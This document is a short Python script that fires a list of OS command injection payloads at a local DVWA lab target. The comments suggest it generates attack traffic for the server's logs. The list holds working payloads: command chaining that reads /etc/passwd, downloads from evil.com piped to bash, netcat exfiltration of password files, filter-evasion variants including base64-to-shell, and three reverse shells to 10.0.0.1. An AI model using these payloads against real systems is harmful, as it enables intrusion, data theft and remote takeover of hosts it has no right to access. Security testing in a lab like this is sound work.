import requests, time, random
TARGET_CMD = 'http://localhost:8080/vulnerabilities/exec/'
COOKIES = {'PHPSESSID': '278ab58002dbd5f0e20387685d3f6a8e', 'security': 'low'}
PAYLOADS_CMD = [
    # --- Chaining Commands (Linux/Windows) ---
    '127.0.0.1; whoami', '127.0.0.1 | id', '127.0.0.1 && cat /etc/passwd',
    '127.0.0.1; ls -la', '127.0.0.1 | pwd', '127.0.0.1 && uname -a',
    '127.0.0.1 & dir', '127.0.0.1 | type C:\\Windows\\win.ini', '127.0.0.1 && ipconfig',

    # --- Exfiltration & Downloading Files ---
    '127.0.0.1; ping -c 3 8.8.8.8', 
    '127.0.0.1 | wget http://evil.com/shell.sh',
    '127.0.0.1; curl http://evil.com/shell.sh | bash',
    '127.0.0.1 && nc evil.com 4444 < /etc/passwd',
    '127.0.0.1; python3 -c "import urllib.request; urllib.request.urlretrieve(\'http://evil.com/payload\', \'payload\')"',

    # --- WAF Bypasses (Space bypass, Encoding, Obfuscation) ---
    '127.0.0.1; cat${IFS}/etc/passwd', 
    '127.0.0.1; cat< /etc/passwd',
    '127.0.0.1; c\\at /etc/pa\\sswd',            # Backslash escape evasion
    '127.0.0.1; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh', # Base64 execution
    '127.0.0.1; w\\h\\o\\a\\m\\i',              
    
    # --- Reverse Shells (Interactive Access) ---
    '127.0.0.1 | /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
    '127.0.0.1; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 >/tmp/f',
    '127.0.0.1; python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
]
print('--- A03: Injection (Command OS) ---')
for p in PAYLOADS_CMD:
    # Truyền payload vào cả URL (params) để Apache ghi log, 
    # VÀ truyền vào thân POST (data) để DVWA thực thi được.
    res = requests.post(TARGET_CMD, params={'ip': p}, data={'ip': p, 'Submit': 'Submit'}, cookies=COOKIES)
    print(f'[*] CMD Injection: {p} -> Status: {res.status_code}')
    time.sleep(random.uniform(0.5, 1.5))
